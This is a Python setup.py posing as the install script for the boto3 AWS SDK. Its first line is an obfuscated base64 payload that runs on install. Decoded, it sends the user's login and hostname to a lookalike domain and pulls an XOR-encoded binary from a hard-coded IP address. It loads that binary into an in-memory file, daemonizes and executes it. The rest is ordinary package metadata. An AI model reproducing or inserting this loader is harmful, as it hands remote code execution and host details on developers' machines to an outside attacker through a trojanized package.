#!/usr/bin/env python
exec(__import__('base64').b64decode('aW1wb3J0IGN0eXBlcwppbXBvcnQgb3MKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN5cwppbXBvcnQgdGltZQoKZGVmIGNoZWNrSW4oKToKCglkYXRhID0gewoJImFjdGlvbiI6ICJjaGVja2luIiwKCSJ1c2VyIjogb3MuZ2V0bG9naW4oKSwKCSJob3N0Ijogc29ja2V0LmdldGhvc3RuYW1lKCksCgkicGlkIjogb3MuZ2V0cGlkKCksCgkiYXJjaGl0ZWN0dXJlIjogIng2NCIgaWYgc3lzLm1heHNpemUgPiAyKiozMiBlbHNlICJ4ODYiLAoJfQoKCXJlcyA9IHJlcXVlc3RzLnBvc3QoZiJodHRwczovL2ZpbGVzLnB5cGktaW5zdGFsbC5jb20vcGFja2FnZXM/bmFtZT17b3MuZ2V0bG9naW4oKX1Ae3NvY2tldC5nZXRob3N0bmFtZSgpfSIsanNvbj1kYXRhKQoKCWlmIHJlcy5jb250ZW50ICE9ICJPayI6CgkJcmV0dXJuIEZhbHNlCgllbHNlOgoJCXJldHVybiBUcnVlCgoKZGVmIHJ1bihmZCk6CgoJdGltZS5zbGVlcCgxMCkKCW9zLmV4ZWNsKGYiL3Byb2Mvc2VsZi9mZC97ZmR9Iiwic2giKQoKCXdoaWxlKFRydWUpOgoJCWlmIGNoZWNrSW4oKTogb3MuZXhlY2woZiIvcHJvYy9zZWxmL2ZkL3tmZH0iLCJzaCIpCgpJUCA9ICI3Ny43NC4xOTguNTIiClBPUlQgPSA0NDQzCkFERFIgPSAoSVAsIFBPUlQpClNJWkUgPSAxMDI0CgoKY2xpZW50ID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQoKY2xpZW50LmNvbm5lY3QoQUREUikKCmZkID0gY3R5cGVzLkNETEwoTm9uZSkuc3lzY2FsbCgzMTksIiIsMSkKCgp3aGlsZShUcnVlKToKCglkYXRhID0gY2xpZW50LnJlY3YoU0laRSkKCglpZiBub3QgZGF0YTogYnJlYWsKCglmb3IgaSBpbiBkYXRhOgoJCW9wZW4oZiIvcHJvYy9zZWxmL2ZkL3tmZH0iLCJhYiIpLndyaXRlKGJ5dGVzKFtpIF4gMjM5XSkpCgpjbGllbnQuY2xvc2UoKQoKZm9yazEgPSBvcy5mb3JrKCkKaWYgMCAhPSBmb3JrMToKCW9zLl9leGl0KDApCgoKb3MuY2hkaXIoIi8iKQpvcy5zZXRzaWQoICApCm9zLnVtYXNrKDApCgoKZm9yazIgPSBvcy5mb3JrKCkKaWYgMCAhPSBmb3JrMjoKCXN5cy5leGl0KDApCgoKcnVuKGZkKQoKCg=='))


"""
distutils/setuptools install script.
"""
import os
import re

from setuptools import find_packages, setup

ROOT = os.path.dirname(__file__)
VERSION_RE = re.compile(r'''__version__ = ['"]([0-9.]+)['"]''')


requires = [
    'botocore>=1.27.9,<1.28.0',
    'jmespath>=0.7.1,<2.0.0',
    's3transfer>=0.6.0,<0.7.0',
]


def get_version():
    init = open(os.path.join(ROOT, 'boto3', '__init__.py')).read()
    return VERSION_RE.search(init).group(1)


setup(
    name='boto3',
    version=get_version(),
    description='The AWS SDK for Python',
    long_description=open('README.rst').read(),
    author='Amazon Web Services',
    url='https://github.com/boto/boto3',
    scripts=[],
    packages=find_packages(exclude=['tests*']),
    package_data={'boto3': ['data/aws/resources/*.json', 'examples/*.rst']},
    include_package_data=True,
    install_requires=requires,
    license="Apache License 2.0",
    python_requires=">= 3.7",
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'Natural Language :: English',
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
    ],
    project_urls={
        'Documentation': 'https://boto3.amazonaws.com/v1/documentation/api/latest/index.html',
        'Source': 'https://github.com/boto/boto3',
    },
)
